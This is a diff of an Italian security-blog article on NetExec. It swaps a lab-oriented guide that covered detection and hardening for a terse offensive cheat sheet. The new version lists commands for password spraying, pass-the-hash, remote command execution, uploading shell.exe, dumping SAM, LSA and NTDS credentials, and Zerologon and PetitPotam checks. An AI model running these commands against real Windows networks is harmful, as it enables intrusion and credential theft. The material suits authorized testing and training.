@@ -1,13 +1,7 @@
 ---
-title: >-
-  NetExec (NXC): Guida Operativa SMB/AD per Enumerazione e Validazare
-  Credenziali in Lab 
+title: 'NetExec (NXC): Guida Operativa SMB/AD per Enumerazione e Validare Credenziali in Lab '
 slug: netexec
-description: >-
-  Guida operativa a NXC (NetExec) per fare enumerazione e validazione
-  credenziali in lab AD/SMB (HTB/PG/VM). Focus offensivo ma controllato: comandi
-  realistici, output atteso, errori comuni e contromisure. Perfetta per passare
-  da “vedo una 445 aperta” a “capisco cosa posso fare con queste credenziali”.
+description: 'Guida operativa a NXC (NetExec) per fare enumerazione e validazione credenziali in lab AD/SMB (HTB/PG/VM). Focus offensivo ma controllato: comandi realistici, output atteso, errori comuni e contromisure. Perfetta per passare da “vedo una 445 aperta” a “capisco cosa posso fare con queste credenziali”.'
 image: /Gemini_Generated_Image_jxrwbzjxrwbzjxrw.webp
 draft: false
 date: 2026-01-24T00:00:00.000Z
@@ -21,434 +15,427 @@ tags:
 featured: false
 ---
 
-# NetExec (NXC): Guida Operativa SMB/AD per Enumerazione e Validazare Credenziali in Lab
+# NetExec (NXC): Guida Operativa SMB/AD per Enumerazione e Validare Credenziali in Lab
 
-Blocchi su SMB/AD perché “non sai cosa aspettarti” dall’output di NXC? Qui lo usi in modo ripetibile per validare credenziali e tirare fuori info utili, **solo in lab/CTF/HTB/PG/VM personali**.
+![Image](https://miro.medium.com/1%2AOKGrLm45IyN6IOobMa408A.png)
 
-## Intro
+NetExec (nxc) è l’evoluzione moderna di CrackMapExec.
+È uno strumento di auditing e penetration testing interno progettato per:
 
-NXC (NetExec) è un tool “offensive operator” per **enumerazione e validazione accessi** su protocolli tipici Windows/AD (soprattutto SMB), con workflow orientato a “testo dentro → segnali operativi fuori”.
-In lab ti serve per trasformare host/porte/creds in risposte: *“utente valido?”, “admin locale?”, “guest abilitato?”, “posso eseguire codice?”, “cosa vedo senza fare rumore?”*.
-Cosa farai in questa guida:
+* Enumerare reti Windows e domini Active Directory
+* Validare credenziali su larga scala
+* Identificare privilegi amministrativi locali
+* Automatizzare movimento laterale
+* Eseguire moduli di auditing e vulnerability check
 
-* capire dove NXC si incastra nel workflow
-* usare 3 pattern che tornano sempre (host → cred → check)
-* fare enumerazione SMB “pulita” e spray controllato
-* leggere segnali di detection e applicare hardening in ottica difensiva
+Lavora principalmente su:
 
-Nota etica: tutto quello che segue è pensato **solo per ambienti autorizzati** (lab/CTF/macchine tue).
+* SMB
+* WinRM
+* LDAP
+* MSSQL
+* RDP
 
-## Cos’è NXC (NetExec) e dove si incastra nel workflow
+È pensato per assessment interni e simulazioni realistiche in ambienti autorizzati.
 
-> **In breve:** NXC accelera la fase “recon con credenziali” su Windows/AD: provi accessi, leggi capacità (es. admin), e tiri fuori enumerazione utile senza reinventare ogni comando a mano.
+***
 
-NXC entra dopo il “recon base” (porte/servizi) e prima della post-exploitation pesante.
-Se hai già usato tooling simile, la mentalità è: *target(s) + credenziali + protocollo → output “decisionale”*.
+# Installazione NetExec (nxc)
 
-Se ti interessa il confronto storico/mentale con tool affini, vedi la guida su **CrackMapExec per automazione SMB/AD**: [https://hackita.it/articoli/crackmapexec/](https://hackita.it/articoli/crackmapexec/)
+## Metodo consigliato (pipx)
 
-Quando NON usarlo: se devi fare analisi forense o debug dettagliato di un singolo protocollo; in quel caso meglio strumenti specifici e verbosi.
+```bash
+python3 -m pip install pipx
+pipx ensurepath
+pipx install netexec
+```
 
-## Installazione e sanity check (Kali/HTB/PG)
-
-> **In breve:** installa NXC dal canale che preferisci e verifica subito help/versione e il “protocol help” per evitare flag sbagliati.
-
-In pratica: in base alla tua distro puoi averlo da pacchetti oppure tramite Python environment (pipx/venv). La regola anti-hallucination è semplice: **prima leggi l’help della tua build**, perché alcune opzioni cambiano.
-
-Perché: confermare che NXC gira e che i subcommand/protocolli sono presenti.
-Cosa aspettarti: help con lista protocolli (SMB/LDAP/WINRM ecc.).
-Comando:
+Verifica:
 
 ```bash
 nxc --help
 ```
 
-Interpretazione: se vedi i protocolli, puoi già lavorare; se mancano, stai usando un’installazione incompleta.
-Errore comune + fix: `command not found` → installazione non in PATH; prova `pipx ensurepath` (se usi pipx) o riapri la shell.
+***
 
-Perché: evitare di usare flag “da blog” non compatibili con la tua versione.
-Cosa aspettarti: help specifico SMB con opzioni dedicate.
-Comando:
+# Sintassi base
 
 ```bash
-nxc smb -h
+nxc <protocollo> <target> -u <utente> -p <password>
 ```
 
-Interpretazione: questa schermata è la tua “fonte di verità” per i flag.
-Errore comune + fix: `invalid choice: 'smb'` → build senza modulo SMB; reinstalla o cambia metodo di install.
+Esempio reale:
 
-## Sintassi base + 3 pattern che userai sempre
+```bash
+nxc smb 10.10.10.10 -u john -p Password123
+```
 
-> **In breve:** i 3 pattern sono: (1) scan host SMB, (2) test credenziali, (3) enum mirata (shares/guest) con output leggibile.
+***
 
-### Pattern 1 — “host alive su SMB”
+# Fase 1 – Enumerazione iniziale rete Windows
 
-Perché: scoprire rapidamente host raggiungibili con SMB nel range lab.
-Cosa aspettarti: lista di host “vivi” che rispondono sulla logica SMB.
-Comando:
+## Identificare host e dominio
 
 ```bash
 nxc smb 10.10.10.0/24
 ```
 
-Esempio di output (può variare):
+Output mostra:
 
-```text
-SMB  10.10.10.10  445  DC01  [*] Windows 10 / Server (name:DC01) (domain:LAB.LOCAL)
-SMB  10.10.10.23  445  WS01  [*] Windows 10 (name:WS01) (domain:LAB.LOCAL)
-```
+* OS
+* Nome dominio
+* SMB signing
+* Versione SMB
 
-Interpretazione: hai target candidati per cred-check ed enumerazione.
-Errore comune + fix: risultati vuoti → subnet sbagliata/VPN down/firewall; verifica routing e connettività.
+Serve per capire:
 
-Se vuoi prima fare naming/NetBIOS “vecchia scuola” per cross-check in LAN lab, vedi **NBTScan per enumerazione NetBIOS**: [https://hackita.it/articoli/nbtscan/](https://hackita.it/articoli/nbtscan/)
+* Se siamo in ambiente dominio
+* Se è possibile relay
+* Se ci sono host legacy
 
-### Pattern 2 — “validazione credenziali (user/pass)”
+***
 
-Perché: capire subito se una coppia credenziali è valida e se hai privilegi (es. admin locale).
-Cosa aspettarti: riga di login status; spesso segnali tipo “Pwn3d!” quando la sessione indica capability elevate.
-Comando:
-
-```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Password123!'
-```
-
-Esempio di output (può variare):
-
-```text
-SMB  10.10.10.10  445  DC01  [+] LAB\alice:Password123! (Pwn3d!)
-```
-
-Interpretazione: credenziale valida; se compare indicatore di “pwned/admin”, hai leve operative maggiori (in lab).
-Errore comune + fix: `STATUS_LOGON_FAILURE` → username formato errato; prova `alice` vs `LAB\alice` e ricontrolla la password.
-
-### Pattern 3 — “enum rapida delle share”
-
-Perché: mappare subito superfici di lettura/scrittura (dove spesso stanno file utili).
-Cosa aspettarti: elenco share e permessi.
-Comando:
+# Fase 2 – Validazione credenziali
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Password123!' --shares
+nxc smb 10.10.10.0/24 -u john -p Password123
 ```
 
-Esempio di output (può variare):
+Output chiave:
 
-```text
-SMB  10.10.10.10  445  DC01  [*] Enumerated shares
-SMB  10.10.10.10  445  DC01  Share      Permissions  Remark
-SMB  10.10.10.10  445  DC01  SYSVOL     READ         Logon server share
-SMB  10.10.10.10  445  DC01  NETLOGON   READ         Logon server share
-```
+* `SUCCESS`
+* `FAIL`
+* `(Pwn3d!)` → privilegi amministrativi locali
 
-Interpretazione: READ su SYSVOL/NETLOGON in lab AD è un segnale utile per policy/script/credenziali “lasciate in giro”.
-Errore comune + fix: output incompleto → permessi insufficienti; riprova con cred differenti o valida prima l’accesso.
+***
 
-## Enumerazione SMB “pulita” (leakage tipici in lab)
+# Password Spraying
 
-> **In breve:** parti da share e accessi “low noise”, poi approfondisci solo se trovi segnali (write, config, script, GPP, ecc.).
-
-In ottica offensiva controllata, SMB è spesso la fonte più “economica” di informazioni.
-La regola: **non eseguire subito**; prima estrai contesto.
-
-Perché: verificare se esiste accesso guest/anon (capita in lab e in ambienti legacy).
-Cosa aspettarti: share enumerate anche con cred “vuote” o utente fittizio.
-Comando:
+Test password contro lista utenti:
 
 ```bash
-nxc smb 10.10.10.10 -u 'a' -p '' --shares
+nxc smb 10.10.10.0/24 -u users.txt -p Summer2024
 ```
 
-Esempio di output (può variare):
-
-```text
-SMB  10.10.10.10  445  DC01  [+] a: (Guest)
-SMB  10.10.10.10  445  DC01  Share      Permissions  Remark
-SMB  10.10.10.10  445  DC01  public     READ         Public share
-```
-
-Interpretazione: in lab questo è “leakage gratuito”; in real world è un misconfig serio.
-Errore comune + fix: `ACCESS_DENIED` → guest disabilitato (normale); passa a cred-check standard.
-
-Perché: capire se conviene scendere a livello “manuale” per browsing/file ops.
-Cosa aspettarti: share che puoi aprire e navigare.
-Comando:
+Lista password su utente:
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Password123!' --shares
+nxc smb 10.10.10.0/24 -u administrator -p passwords.txt
 ```
 
-Interpretazione: quando trovi share interessanti, spesso conviene usare strumenti dedicati per navigare e scaricare file.
-Errore comune + fix: confondere “READ” con “WRITE” → verifica sempre permessi prima di tentare upload.
-
-Per la parte manuale di listing/download/upload da SMB, usa **smbclient**: [https://hackita.it/articoli/smbclient/](https://hackita.it/articoli/smbclient/)
-
-Quando NON usarlo: se il target è estremamente “sensibile” (anche in lab simulazioni blue-team) e vuoi ridurre l’impronta; in quel caso limita i check e passa a query mirate.
-
-## Password spraying in lab (controllato) + validazione
-
-> **In breve:** lo spray va fatto con logica e limiti (lockout, frequenza, scope). In lab impari il pattern senza trasformarlo in bruteforce cieco.
-
-Spray “buono” = pochi tentativi per utente, password plausibili, stop quando hai successo, e consapevolezza lockout.
-
-Perché: testare una password su una lista utenti senza bruteforce per-utente.
-Cosa aspettarti: righe di success/fail; su success, ti fermi o continui in modo controllato.
-Comando:
+Continuare dopo successo:
 
 ```bash
-nxc smb 10.10.10.10 -u users.txt -p 'Winter2026!' --continue-on-success --no-bruteforce
+nxc smb 10.10.10.0/24 -u users.txt -p Password123 --continue-on-success
 ```
 
-Esempio di output (può variare):
+***
 
-```text
-SMB  10.10.10.10  445  DC01  [-] LAB\bob:Winter2026! (STATUS_LOGON_FAILURE)
-SMB  10.10.10.10  445  DC01  [+] LAB\alice:Winter2026! (Pwn3d!)
-```
+# Autenticazione avanzata
 
-Interpretazione: hai almeno una cred valida; passa subito a enum mirata (shares/priv).
-Errore comune + fix: lockout in lab → riduci scope, aumenta delay e verifica policy prima (anche simulata).
-
-Detection (segnali): molte 4625/failed logon in poco tempo, spike su DC o host.
-Hardening/mitigazione: lockout policy coerente, MFA dove possibile, password policy robusta, alert su spray pattern.
-
-## Moduli e azioni “da lab” (senza sparare nel buio)
-
-> **In breve:** prima elenchi le capability, poi scegli moduli/azioni solo se hai un motivo (creds valide, permessi, obiettivo chiaro).
-
-NXC può fare molto oltre l’enum: in lab spesso viene usato per verificare se, con una cred, puoi anche “spingerti” verso esecuzione o raccolta.
-La disciplina operativa è: **capability → azione → verifica → stop**.
-
-Perché: vedere cosa la tua build espone come opzioni e (eventuali) moduli.
-Cosa aspettarti: lista opzioni; se disponibile, anche lista moduli per protocollo.
-Comando:
+## Null session
 
 ```bash
-nxc smb -h
+nxc smb 10.10.10.10 --null-session
 ```
 
-Interpretazione: scegli solo 1–2 azioni a valore (es. `--shares`) prima di pensare a esecuzione.
-Errore comune + fix: usare moduli senza prerequisiti → leggi help/parametri e prova su una sola macchina lab.
-
-Perché: capire se una credenziale è “operativa” (es. admin locale) senza inventarti catene.
-Cosa aspettarti: indicatore nel risultato (spesso segnala privilegi elevati quando possibile).
-Comando:
+## Pass-the-Hash
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Password123!'
+nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-Interpretazione: se sei admin locale, il tuo workflow cambia: puoi passare a azioni più “impattanti” (sempre in lab).
-Errore comune + fix: confondere “login ok” con “admin” → non dare per scontato; valida con segnali e check dedicati.
-
-Detection (segnali): autenticazioni ripetute, tentativi su più host, pattern coerente con tool automation.
-Hardening/mitigazione: segmentazione SMB, SMB signing dove applicabile, limitazione admin locali, auditing, EDR.
-
-## Alternative e tool correlati (quando preferirli)
-
-> **In breve:** NXC è “multi-check veloce”. Per task specifici spesso vincono tool specializzati.
-
-* Per enum “single-host” molto dettagliata: strumenti nativi o query specifiche.
-* Per mapping AD e relazioni: BloodHound (ottimo per visualizzare percorsi di privilegio).
-* Per query LDAP a mano: ldapsearch e filtri mirati.
-
-Se stai costruendo una picture AD “seria” in lab, collega i dati a **BloodHound**: [https://hackita.it/articoli/bloodhound/](https://hackita.it/articoli/bloodhound/)
-
-Per interrogazioni LDAP precise (filtri, attributi, OU), usa **ldapsearch**: [https://hackita.it/articoli/ldapsearch/](https://hackita.it/articoli/ldapsearch/)
-
-## Hardening & detection (cosa vede la difesa)
-
-> **In breve:** NXC lascia impronte riconoscibili: autenticazioni, enumerazioni SMB e (se presenti) tentativi di esecuzione. In lab devi imparare anche “come ti beccano”.
-
-Segnali tipici (dipende dal lab e dai log abilitati):
-
-* molte autenticazioni fallite/success in poco tempo (spray)
-* accessi SMB su share note (SYSVOL/NETLOGON/public) da host “attacker”
-* pattern ripetitivo su più target in subnet
-
-Hardening/mitigazione (approccio pratico):
-
-* riduci superficie SMB (host non necessari, segmentazione)
-* password policy e lockout sensati + alert su spray
-* auditing di logon e accessi a share sensibili
-* limita admin locali e rimuovi cred “riutilizzate”
-* EDR/alert su tool-like behavior e tentativi di remote exec
-
-Quando NON usarlo: se stai simulando un engagement “stealth” (anche in lab), evita scan/spray larghi; lavora host-by-host e con scope minimal.
-
-## Scenario pratico: NXC su una macchina HTB/PG
-
-> **In breve:** obiettivo: validare cred, enumerare share e capire se la cred è “operativa” (admin) con 3 comandi netti.
-
-Ambiente: attacker Kali (VPN), target `10.10.10.10` (Windows/AD lab).
-Obiettivo: trovare superfici utili (share) e capire se una cred lab è “pwned/admin”.
-
-Perché: confermare che SMB risponde e avere contesto (hostname/domain).
-Cosa aspettarti: banner/identità target.
-Comando:
+## Kerberos
 
 ```bash
-nxc smb 10.10.10.10
+nxc smb 10.10.10.10 -u john --kerberos
 ```
 
-Interpretazione: se vedi name/domain, sei pronto per cred-check.
-Errore comune + fix: nessun output → connettività/VPN/routing.
-
-Perché: validare cred e vedere subito se hai privilegi elevati.
-Cosa aspettarti: login ok e possibile indicatore di admin.
-Comando:
+Forzare autenticazione locale:
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Winter2026!'
+nxc smb 10.10.10.10 -u john -p Password123 --local-auth
 ```
 
-Interpretazione: se la cred è valida, passi all’enum; se appare segnale “admin”, prendi nota.
-Errore comune + fix: fail logon → prova formato utente diverso o cred alternative.
+***
 
-Perché: enumerare share e capire dove guardare prima.
-Cosa aspettarti: lista share con permessi.
-Comando:
+# SMB Enumeration
+
+## Share
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Winter2026!' --shares
+nxc smb 10.10.10.10 -u john -p Password123 --shares
 ```
 
-Interpretazione: priorità a share con READ/WRITE e a share “di dominio” (in lab spesso contengono artefatti).
-Errore comune + fix: output “vuoto” → cred ok ma permessi limitati; cambia utente o enum su altro host.
-
-Detection + hardening: lo scenario genera logon e accessi SMB; in blue-team lab li becchi con alert su 4624/4625 e accessi a share sensibili. Mitiga con segmentazione SMB, auditing e lockout policy.
-
-## Playbook 10 minuti: NXC in un lab
-
-> **In breve:** sequenza corta e ripetibile per passare da target a enumerazione utile, senza spray cieco.
-
-### Step 1 – Conferma target SMB vivo
-
-Valida rapidamente che il target risponda e annota name/domain.
+## Utenti dominio
 
 ```bash
-nxc smb 10.10.10.10
+nxc smb 10.10.10.10 -u john -p Password123 --users
 ```
 
-### Step 2 – Prova credenziali (singolo utente)
-
-Prima di qualsiasi cosa “larga”, testa una cred che hai già.
+## Gruppi
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Password123!'
+nxc smb 10.10.10.10 -u john -p Password123 --groups
 ```
 
-### Step 3 – Enum share (valore alto, rumore basso)
-
-Le share spesso ti danno file/config senza “rompere” niente.
+## Computer
 
 ```bash
-nxc smb 10.10.10.10 -u 'LAB\alice' -p 'Password123!' --shares
+nxc smb 10.10.10.10 -u john -p Password123 --computers
 ```
 
-### Step 4 – Check guest/anon se il lab lo consente
-
-Utile per capire misconfig e leakage “gratis”.
+## Logged-on users
 
 ```bash
-nxc smb 10.10.10.10 -u 'a' -p '' --shares
+nxc smb 10.10.10.10 -u john -p Password123 --loggedon-users
 ```
 
-### Step 5 – Spray controllato (solo se serve e se non locki)
-
-Riduci scope e usa opzioni anti-bruteforce.
+## Password policy
 
 ```bash
-nxc smb 10.10.10.10 -u users.txt -p 'Winter2026!' --continue-on-success --no-bruteforce
+nxc smb 10.10.10.10 -u john -p Password123 --pass-pol
 ```
 
-### Step 6 – Passa a tool specializzati per approfondire
+***
 
-Quando trovi share o segnali AD, passa a strumenti dedicati per query/visualizzazione (non restare bloccato su un solo tool).
+# RID Brute
 
-## Checklist operativa
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 --rid-brute
+```
 
-> **In breve:** spunta questi punti per usare NXC in modo efficace e “pulito” in lab.
+**Se usi NetExec (NXC), sappi che è il successore diretto di CrackMapExec (CME).**\
+Prima di NXC c'era CME - ora **NXC è la versione attiva, aggiornata e mantenuta**.
 
-* Contesto: solo lab/CTF/HTB/PG/VM personali, scope chiaro.
-* `nxc --help` e `nxc smb -h` letti prima di usare flag.
-* Target validato (`nxc smb <ip>`), name/domain annotati.
-* Cred-check su singolo utente prima di qualunque spray.
-* `--shares` sempre tra i primi check.
-* Guest/anon check solo se ha senso nel lab.
-* Spray: pochi tentativi, scope ridotto, attenzione lockout.
-* Su success: stop e pivot su enum mirata (non continuare “per sport”).
-* Output salvato/loggato (note operative) per non rifare scan inutili.
-* Detection mindset: sai quali segnali stai generando e perché.
-* Se serve profondità: passa a tool specializzati (SMB file ops, LDAP query, AD graph).
+**COSA È CAMBIATO:**
 
-## Riassunto 80/20
+* **Prima:** `crackmapexec` (CME) - abbandonato, buggato, fermo al 2021
+* **Ora:** `netexec` (NXC) - sviluppato attivamente, fix critici, nuove feature
 
-> **In breve:** 5 mosse che coprono la maggior parte dei casi d’uso NXC in lab.
+**COMANDI:**
 
-| Obiettivo               | Azione pratica                  | Comando/Strumento                                           |
-| ----------------------- | ------------------------------- | ----------------------------------------------------------- |
-| Trovare host SMB vivi   | Scan subnet lab                 | `nxc smb 10.10.10.0/24`                                     |
-| Identificare target     | Banner/name/domain              | `nxc smb 10.10.10.10`                                       |
-| Validare credenziali    | Login check + capability        | `nxc smb 10.10.10.10 -u 'LAB\alice' -p '...'`               |
-| Trovare superfici utili | Enumerare share                 | `nxc smb 10.10.10.10 -u ... -p ... --shares`                |
-| Spray controllato       | Test 1 password su lista utenti | `nxc smb 10.10.10.10 -u users.txt -p '...' --no-bruteforce` |
+```bash
+# Vecchio (CME) - ORA DEPRECATO
+crackmapexec smb 192.168.1.0/24
 
-## Concetti controintuitivi
+# Nuovo (NXC) - USA QUESTO
+nxc smb 192.168.1.0/24
+```
 
-> **In breve:** errori tipici che fanno perdere tempo o generano rumore inutile.
+**📖 APPROFONDISCI:**
 
-* **“Se logga allora sono admin”**
-  Non è vero: login valido ≠ privilegi elevati. In lab valida sempre capability e fai enum mirata prima di eseguire altro.
-* **“Spray subito su tutta la subnet”**
-  È rumore e rischi lockout. Fai prima share/enum e limita scope; lo spray è una scelta, non un riflesso.
-* **“Un solo tool per tutto”**
-  NXC è ottimo per triage e check rapidi. Per file ops, LDAP query o AD graph, vincono tool specializzati.
-* **“Output = verità assoluta”**
-  Dipende da policy, hardening e versione tool. Se qualcosa non torna, torna all’help e ripeti su un singolo host.
+* **Per confrontare con il vecchio CME:** [https://hackita.it/articoli/crackmapexec](https://hackita.it/articoli/crackmapexec)
 
-## FAQ
+**NXC È CME, MA FUNZIONANTE.**
 
-D: NXC e NetExec sono la stessa cosa?
-R: In pratica sì: “NXC” è il comando/alias comune per NetExec. Verifica la tua install con `nxc --help`.
+***
 
-D: Posso usare NXC senza credenziali?
-R: Sì, per discovery e per alcuni check (es. host mapping). Ma il valore vero arriva quando validi cred e fai enum con permessi reali.
+# LDAP Enumeration
 
-D: “Pwn3d!” cosa significa?
-R: È un indicatore operativo che suggerisce capability elevate (tipicamente admin locale) sul protocollo/host. Non sostituisce una validazione mirata.
+## Utenti
 
-D: Come riduco il rischio lockout durante lo spray?
-R: Riduci scope, pochi tentativi, usa opzioni anti-bruteforce e conosci la policy del lab. Se non sai la policy, evita spray.
+```bash
+nxc ldap 10.10.10.10 -u john -p Password123 --users
+```
 
-D: Meglio NXC o strumenti manuali?
-R: NXC per triage e automazione rapida; strumenti manuali quando serve controllo fine, debugging o operazioni specifiche.
+## Gruppi
 
-## Link utili su HackIta.it
+```bash
+nxc ldap 10.10.10.10 -u john -p Password123 --groups
+```
 
-* Automazione SMB/AD con CrackMapExec: [https://hackita.it/articoli/crackmapexec/](https://hackita.it/articoli/crackmapexec/)
-* Enumerazione SMB e file ops con smbclient: [https://hackita.it/articoli/smbclient/](https://hackita.it/articoli/smbclient/)
-* Enum AD grafica con BloodHound: [https://hackita.it/articoli/bloodhound/](https://hackita.it/articoli/bloodhound/)
-* Query LDAP operative con ldapsearch: [https://hackita.it/articoli/ldapsearch/](https://hackita.it/articoli/ldapsearch/)
-* LLMNR/NBNS e capture in lab con Inveigh: [https://hackita.it/articoli/inveigh/](https://hackita.it/articoli/inveigh/)
-* Recon NetBIOS con NBTScan: [https://hackita.it/articoli/nbtscan/](https://hackita.it/articoli/nbtscan/)
+## Admin count
 
-Inoltre:
+```bash
+nxc ldap 10.10.10.10 -u john -p Password123 --admin-count
+```
 
-* /supporto/
-* /contatto/
-* /articoli/
-* /servizi/
-* /about/
-* /categorie/
+## Oggetti delega
 
-## Riferimenti autorevoli
+```bash
+nxc ldap 10.10.10.10 -u john -p Password123 --trusted-for-delegation
+```
 
-* [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
-* [https://www.netexec.wiki/](https://www.netexec.wiki/)
+***
 
-Supporta HackIta: se questi playbook ti fanno risparmiare ore in lab, considera di sostenermi su /supporto/.
+# Command Execution
 
-Formazione 1:1: se vuoi una roadmap pratica (HTB/PG/OSCP-style) e review dei tuoi workflow, trovi i dettagli su /servizi/.
+## SMB - CMD
 
-Servizi per aziende/assessment: per test autorizzati, simulazioni e security review operative, contattami su /servizi/.
+```bash
+nxc smb 10.10.10.20 -u administrator -p Password123 -x whoami
+```
+
+## SMB - PowerShell
+
+```bash
+nxc smb 10.10.10.20 -u administrator -p Password123 -X "Get-Process"
+```
+
+## WinRM - CMD
+
+```bash
+nxc winrm 10.10.10.20 -u john -p Password123 -x whoami
+```
+
+## WinRM - PowerShell
+
+```bash
+nxc winrm 10.10.10.20 -u john -p Password123 -X "ipconfig"
+```
+
+***
+
+# MSSQL Enumeration
+
+## Query SQL
+
+```bash
+nxc mssql 10.10.10.15 -u sa -p Password123 -q "SELECT name FROM master.dbo.sysdatabases"
+```
+
+## Esecuzione comando
+
+```bash
+nxc mssql 10.10.10.15 -u sa -p Password123 -x whoami
+```
+
+***
+
+# File Operations
+
+## Spider share
+
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 --spider C$
+```
+
+## Download file
+
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 --share C$ --get-file users.txt users.txt
+```
+
+## Upload file
+
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 --share C$ --put-file shell.exe shell.exe
+```
+
+***
+
+# Dump credenziali
+
+## Dump SAM
+
+```bash
+nxc smb 10.10.10.20 -u administrator -p Password123 --sam
+```
+
+## Dump LSA
+
+```bash
+nxc smb 10.10.10.20 -u administrator -p Password123 --lsa
+```
+
+## Dump NTDS
+
+```bash
+nxc smb 10.10.10.10 -u administrator -p Password123 --ntds
+```
+
+***
+
+# Moduli Vulnerabilità
+
+## Zerologon
+
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 -M zerologon
+```
+
+## PetitPotam
+
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 -M petitpotam
+```
+
+## MS17-010
+
+```bash
+nxc smb 10.10.10.10 -u john -p Password123 -M ms17-010
+```
+
+***
+
+# Output su file
+
+```bash
+nxc smb 10.10.10.0/24 -u john -p Password123 --output output.csv
+```
+
+***
+
+# Tabella Operativa
+
+| Obiettivo            | Comando                  | Risultato         |
+| -------------------- | ------------------------ | ----------------- |
+| Scan rete            | `smb 10.10.10.0/24`      | Identifica host   |
+| Validare credenziali | `-u john -p Password123` | Accesso valido    |
+| Verificare admin     | `(Pwn3d!)`               | Pivot possibile   |
+| Dump credenziali     | `--sam`                  | Hash locali       |
+| Lateral movement     | `-x whoami`              | Esecuzione remota |
+
+***
+
+# Checklist Operativa Finale
+
+* Identificare subnet
+* Validare credenziale iniziale
+* Spray controllato
+* Individuare admin locali
+* Enumerare dominio
+* Eseguire comando remoto
+* Dump credenziali
+* Documentare evidenze
+
+***
+
+# FAQ
+
+### NetExec è diverso da CrackMapExec?
+
+Sì, è la sua evoluzione moderna con miglioramenti di stabilità e manutenzione attiva.
+
+### Supporta Kerberos?
+
+Sì, inclusa autenticazione ticket-based.
+
+### È rilevabile?
+
+Sì. Genera log di autenticazione su sistemi Windows.
+
+### È adatto per internal network audit?
+
+Sì. È progettato proprio per auditing e assessment interni.
+
+***
+
+## HackITA — Supporta la Crescita della Formazione Offensiva
+
+Se questo contenuto ti è stato utile e vuoi contribuire alla crescita di HackITA, puoi supportare direttamente il progetto qui:
+
+👉 [https://hackita.it/supporta](https://hackita.it/supporta)
+
+Il tuo supporto ci permette di sviluppare lab realistici, guide tecniche avanzate e scenari offensivi multi-step pensati per professionisti della sicurezza.
+
+***
+
+## Vuoi Testare la Tua Azienda o Portare le Tue Skill al Livello Successivo?
+
+Se rappresenti un’azienda e vuoi valutare concretamente la resilienza della tua infrastruttura contro attacchi mirati, oppure sei un professionista/principiante che vuole migliorare con simulazioni reali:
+
+👉 [https://hackita.it/servizi](https://hackita.it/servizi)
+
+Red Team assessment su misura, simulazioni complete di kill chain e percorsi formativi avanzati progettati per ambienti enterprise reali.
